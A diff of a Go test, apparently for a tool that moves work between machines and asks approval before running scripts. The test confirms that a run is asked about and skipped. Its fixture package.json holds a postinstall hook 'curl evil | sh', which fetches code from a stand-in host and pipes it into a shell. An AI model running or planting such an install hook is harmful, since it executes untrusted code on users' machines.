@@ -29,6 +29,8 @@ func TestRestoreFromKantAsksEveryRunOnTheLaptop(t *testing.T) {
 	w.write(kwt, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`)
 	w.approve(w.laptop, restoreScript) // approved before; still has to ask
 	w.approve(w.kant, dehydrateScript)
+	// Restore's marker from kant's run would travel back as an ignored file.
+	os.Remove(filepath.Join(kwt, ".restored"))
 
 	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
 	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "skipped") {
